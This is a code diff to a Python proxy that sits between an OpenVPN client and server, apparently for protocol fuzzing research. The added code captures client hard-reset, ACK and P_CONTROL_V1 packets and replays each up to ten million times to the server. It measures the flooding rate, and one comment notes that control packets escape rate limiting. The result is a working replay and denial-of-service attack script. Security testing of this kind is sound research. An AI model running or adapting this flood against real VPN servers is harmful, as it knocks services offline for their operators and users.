@@ -7,6 +7,7 @@ import secrets
 import argparse
 import sys
 import itertools
+import time
 
 # we use this src for the replay testing part, since it will use some measurement of replay intensity
 
@@ -39,7 +40,8 @@ server_port = 1194
 # "control_v1" "client_restart_v2" "ack_c" "ack_s"
 # "ndss_restart" means the forced negotiation crash attack in the ndss 2022 paper
 replay_select = "none"
-
+num_replay = 10000000
+saved_client_restart_v2 = None
 # allowed_pkt_num = 3 will cause retransmission of M3(from client) and M4, M6 (from server)
 # allowed_pkt_num = 4 will cause retransmission of M4, M6 (from server) and the M5(ack) from client
 # allowed_pkt_num = 5(ack) will cause sending of M6 from server
@@ -60,6 +62,7 @@ pktnum = 0
 
 allowed_control_v1_num = 100 # we increase it from 1, 2, 3, 4, 5, 6, 7, 8, 9, 10
 sent_control_v1_num = 0
+resume_control_v1_num = 20
 
 # below for fuzzing
 # when a P_CONTROL_V1 pkt comes, we remember its order for the client / server respectively
@@ -425,24 +428,109 @@ class TCPProxyProtocol(protocol.Protocol):
         global resume_pkt_num
         global pktnum
 
+        global num_replay
+        global allowed_control_v1_num
+        global control_v1_num
+        global resume_control_v1_num
+        global saved_client_restart_v2
+
+        num_replay = args.num_replay
+        allowed_control_v1_num = args.allowed_control_v1_num
+        resume_control_v1_num = args.resume_control_v1_num
+
         fuzzeddata = data 
         pktnum+=1
 
         get2fields = to_get_op_code(data) 
         getopcode = (get2fields.Type & OPCODE_MASK) >> 3
         print("openvpn packet len", get2fields.plen, " and opcode", getopcode)
+        openvpn_packet = get2fields
         
-
         if sent_pkt_num < allowed_pkt_num or pktnum >= resume_pkt_num:
             if self.proxy_to_server_protocol:
                 self.proxy_to_server_protocol.write(data)
             else:
                 self.buffer = data
+                print("late launch of right part happens")
             print("CLIENT => SERVER, length:", len(data))
             sent_pkt_num += 1
 
         else:
             print("CLIENT => SERVER: we delibrately stop sending with sent_pkt_num", sent_pkt_num, "and pkt len", len(data))
+
+        # replay part 
+        # if the pkt is Client_hard_reset_v2, we generate 100 such pkts to see the effects
+        if getopcode == 0x07 and args.fuzzway == "replay" and args.pkt == "client_restart_v2":
+            saved_client_restart_v2 = openvpn_packet
+            print("we first save the client_restart_v2 and wait later to replay")
+                # else:
+                #     self.buffer = bytes(new_pkt)
+                #     print("late launch of right part happens") 
+                #     print("use buffer to send a copy of client-restart-v2, ", len(bytes(new_pkt)))
+
+        # we think the right part protocol has launched up now, and current op is no 7, we have stored the one to replay, do it 
+        if args.fuzzway == "replay" and args.pkt == "client_restart_v2" and saved_client_restart_v2 and getopcode !=0x07:
+            print("we use the initial pkt from client and tart sending", num_replay, " copies of it")
+            for i in range(num_replay):
+                new_pkt = saved_client_restart_v2
+                # create a new random 8 byte client session ID in the type of int
+                # print("SHOULD DEBUG SETTING THE NEW RANDOM SESSION ID.....")
+                # new_pkt.Session_ID = int.from_bytes(secrets.token_bytes(8), byteorder='big')
+                # print("sent a new packet with randomly-created client session_id to server: 1194")
+            
+                if self.proxy_to_server_protocol:
+                    self.proxy_to_server_protocol.write(bytes(new_pkt))
+                    # print("use write to send a copy of client-restart-v2, ", len(bytes(new_pkt)))
+    
+
+        if getopcode == 0x05 and args.fuzzway == "replay" and args.pkt == "ack_c":
+            print("we got an ack packet from client")
+            new_pkt = openvpn_packet
+            bytes_new_pkt = bytes(new_pkt)
+            len_bytes_new_pkt = len(bytes_new_pkt)
+            start_time = time.time() 
+            total_bytes_sent = 0 
+
+            print(f"Below we will send {num_replay} copies of {len_bytes_new_pkt}-bytes ack pkt to server: 1194")
+            for i in range(num_replay): # 100000 for ack_c no tls-auth, 100000 for tls-auth
+                self.proxy_to_server_protocol.write(bytes(new_pkt))
+                total_bytes_sent += len_bytes_new_pkt
+                # print("sent a copy of ack packet to server")
+                
+                if i==1000:
+                    print("we measure the sending rate when 1000 packets are sent")
+                    end_time = time.time() 
+                    total_time = end_time - start_time
+                    if total_time > 0:  
+                        bytes_per_second = total_bytes_sent / total_time  
+                        print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
+                        print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
+
+
+        if getopcode == 0x04 and args.fuzzway == "replay" and args.pkt == "control_v1":
+            print("we got the p_control_v1 pkt from client")
+            new_pkt = openvpn_packet
+            bytes_new_pkt = bytes(new_pkt)
+            len_bytes_new_pkt = len(bytes_new_pkt)
+            start_time = time.time() 
+            total_bytes_sent = 0 
+
+            print(f"Below we will send {num_replay} copies of {len_bytes_new_pkt}-bytes p_control_v1 pkt to server: 1194")
+            for i in range(num_replay): # 1000 for no tls-auth, 100000 for tls-auth
+                # simply replay the p_control_v1 pkt since it won't be checked with rate limit
+                self.proxy_to_server_protocol.write(bytes(new_pkt))
+                total_bytes_sent += len_bytes_new_pkt
+                
+                if i==1000:
+                    print("we measure the sending rate when 1000 packets are sent")
+                    end_time = time.time() 
+                    total_time = end_time - start_time
+                    if total_time > 0:  
+                        bytes_per_second = total_bytes_sent / total_time  
+                        print(f"Total bytes sent: {total_bytes_sent} bytes in {total_time:.2f} seconds.")
+                        print(f"Bytes per second: {bytes_per_second:.2f} bytes/sec")
+
+ 
  
     def write(self, data):
         self.transport.write(data)
@@ -486,7 +574,6 @@ class ProxyToServerProtocol(protocol.Protocol):
         get2fields = to_get_op_code(data) 
         getopcode = (get2fields.Type & OPCODE_MASK) >> 3
         print("openvpn packet len", get2fields.plen, " and opcode", getopcode)
-
         
         if sent_pkt_num < allowed_pkt_num or pktnum >= resume_pkt_num:
             self.factory.server.write(data)
@@ -494,8 +581,8 @@ class ProxyToServerProtocol(protocol.Protocol):
             sent_pkt_num += 1
         else:
             print("SERVER => CLIENT: we delibrately stop sending with sent_pkt_num", sent_pkt_num, "and pkt len", len(data))
-      
- 
+
+     
     def write(self, data):
         if data:
             self.transport.write(data)
@@ -508,6 +595,10 @@ def main():
     parser.add_argument("--field", type=str, help="the selectd field to fuzz", default="None")
     parser.add_argument("--howto", type=str, help="how to change the field value", default="None")
     parser.add_argument("--bunch", type=str, help="the selected bunch of messages to reorder", default="None")
+    parser.add_argument("--num_replay", type=int, help="the num of replay", default=10000000)
+    parser.add_argument("--allowed_control_v1_num", type=int, help="the threshold of allowed control_v1 pkt num", default=200000)
+    parser.add_argument("--resume_control_v1_num", type=int, help="the threshold of control_v1 pkt num to resume sending", default=20000)
+
 
     global args 
     args = parser.parse_args()
